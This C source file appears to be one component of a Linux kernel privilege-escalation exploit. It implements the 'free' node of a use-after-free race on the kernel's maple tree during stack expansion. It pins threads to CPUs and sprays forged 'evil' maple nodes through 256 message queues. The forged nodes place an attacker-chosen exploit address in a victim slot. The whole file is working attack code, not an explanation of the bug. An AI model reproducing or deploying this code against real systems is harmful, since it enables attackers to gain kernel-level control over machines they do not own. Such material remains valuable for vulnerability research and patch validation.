#pragma once
#include "../nolibc/nolibc.h"
#include "../consts/log.h"
#include "../consts/msg.h"
#include "../consts/stack.h"
#include "../sys/msg.h"
#include "../sysutil/clone.h"
#include "../sysutil/pin_cpu.h"
#include "../sysutil/mbarrier.h"
#include "nodes_decl.h"
#include "nodes_master_free_use.h"
#include "nodes_master_and_free.h"
#include "nodes_free_and_use.h"
#include <linux/wait.h>

#define MAPLE_MSQNUM 256
#define MAPLE_MSQKEY 8888
#define MAPLE_MSQTYP 1

static int maple_msqids[MAPLE_MSQNUM];

static void __cleanup_maple_msq(int i)
{
	int retval;

	retval = msgctl(maple_msqids[i], IPC_RMID, NULL);
	if (retval < 0)
		perror(L_ERROR "[-] Cannot destory maple-node message queues");
}

static void __cleanup_maple_msqs(void)
{
	int i;

	for (i = 0; i < MAPLE_MSQNUM; ++i)
		__cleanup_maple_msq(i);
}

static void cleanup_fildes(void)
{
	close(fd_proc_maps);

	__cleanup_maple_msqs();
}

static int __open_proc_maps(void)
{
	int fd;

	fd = open("/proc/self/maps", O_RDONLY);
	if (fd < 0) {
		perror(L_ERROR "[-] Cannot open \"/proc/self/maps\"");
		return fd;
	}

	fd_proc_maps = fd;

	return 0;
}

static int __open_maple_msq(int i)
{
	int retval;

	retval = msgget(MAPLE_MSQKEY + i, IPC_CREAT | 0600);
	if (retval < 0) {
		perror(L_ERROR
		       "Cannot create message queues to forge maple nodes");
		return retval;
	}

	maple_msqids[i] = retval;

	return 0;
}

static int __open_maple_msqs(void)
{
	int i, retval;

	for (i = 0; i < MAPLE_MSQNUM; ++i) {
		retval = __open_maple_msq(i);
		if (retval < 0)
			goto err;
	}

	return 0;
err:
	for (--i; i >= 0; --i)
		__cleanup_maple_msq(i);
	return retval;
}

static int open_necessary_files(void)
{
	int retval;

	retval = __open_proc_maps();
	if (retval < 0)
		return retval;

	retval = __open_maple_msqs();
	if (retval < 0) {
		close(fd_proc_maps);
		return retval;
	}

	return 0;
}

static char node_use_stack[COMMON_STACK_SIZE] STACK_ALIGNED;

static pid_t spawn_node_use(void)
{
	pid_t pid;

	pid = clone_same_vm(&run_node_use, node_use_stack, COMMON_STACK_SIZE);
	if (pid < 0) {
		perror(L_ERROR "[-] Cannot create the \"use\" node");
		return pid;
	}

	if (pin_cpu2(pid, CPU_1) < 0)
		perror(L_ERROR
		       "[-] Cannot move the \"free\" node to the second CPU");

	if (waitpid(pid, NULL, __WCLONE | WSTOPPED) < 0)
		perror(L_ERROR
		       "[-] Cannot wait for the \"use\" node to enter the STOPPED state");

	return pid;
}

#define MAPLE_RANGE64_SLOTS 16

#define MA_ROOT_PARENT 1

struct maple_range_64 {
	unsigned long parent;
	unsigned long pivot[MAPLE_RANGE64_SLOTS - 1];
	unsigned long slot[MAPLE_RANGE64_SLOTS - 1];
	struct maple_metadata {
		unsigned char end;
		unsigned char gap;
	} meta;
};

#define MAPLE_NODE_SIZE 256
_Static_assert(sizeof(struct maple_range_64) == MAPLE_NODE_SIZE,
	       "Incorrect MAPLE_NODE_SIZE");

#define VICTIM_SLOT 10

static struct maple_range_64 maple_node;

static void init_maple_nodes(void)
{
	maple_node.parent = MA_ROOT_PARENT;

	maple_node.slot[VICTIM_SLOT] = 0xdeadbeef;
	maple_node.pivot[VICTIM_SLOT] = ~0UL;

	maple_node.meta.end = VICTIM_SLOT;
}

static void prepare_maple_nodes(unsigned long addr)
{
	maple_node.slot[VICTIM_SLOT] = addr;
}

static void __send_maple_node(int start, int end)
{
	int retval, i;
	struct msg_hdr *hdr;

	hdr = (void *)&maple_node + KERNEL_MSGHDR_SIZE - USERSPACE_MSGHDR_SIZE;
	hdr->type = MAPLE_MSQTYP;

	for (i = start; i < end; ++i) {
		retval = msgsnd(maple_msqids[i], hdr,
				MAPLE_NODE_SIZE - KERNEL_MSGHDR_SIZE, 0);
		if (retval < 0)
			perror(L_ERROR
			       "[-] Cannot send evil maple nodes to message queues");
	}
}

#define PAD_MSQNUM 256
#define UAF_MSQNUM 32

static void send_pad_maple_nodes(void)
{
	__send_maple_node(0, PAD_MSQNUM);
}

static void send_uaf_maple_nodes(void)
{
	__send_maple_node(0, UAF_MSQNUM);
}

static volatile int uaf_ready_to_go;

static void wait_uaf_ready(void)
{
	while (!uaf_ready_to_go)
		asm volatile("pause" : : : "memory");

	uaf_ready_to_go = 0;
}

static void __trigger_uaf(void)
{
	*(volatile char *)stack_expansion_victim = 'x';

	send_pad_maple_nodes();

	synchronize_rcu();

	send_uaf_maple_nodes();
}

static void trigger_uaf(pid_t pid)
{
	int retval;

	sched_yield();

	retval = kill(pid, SIGCONT);
	if (retval < 0) {
		perror(L_ERROR "[-] Cannot resume the stopped \"use\" node");
		return;
	}

	wait_uaf_ready();
	msleep(free_timing_msec);

	__trigger_uaf();
}

static int run_node_free(void)
{
	pid_t pid;
	int retval;

	retval = open_necessary_files();
	if (retval < 0)
		return retval;

	init_maple_nodes();

	prepare_maple_nodes(exploit_address);

	pid = spawn_node_use();
	if (pid < 0) {
		cleanup_fildes();
		return pid;
	}

	trigger_uaf(pid);

	if (healthcheck_state == HEALTHCHECK_INIT)
		++healthcheck_state;
	fputs(L_DOING "[ ] UAF state update: \"free\" has been completed\n",
	      stderr);

	retval = waitpid(pid, NULL, __WCLONE);
	if (retval < 0)
		perror(L_ERROR
		       "[-] Cannot wait for the \"free\" node to terminate");

	cleanup_fildes();

	return 0;
}
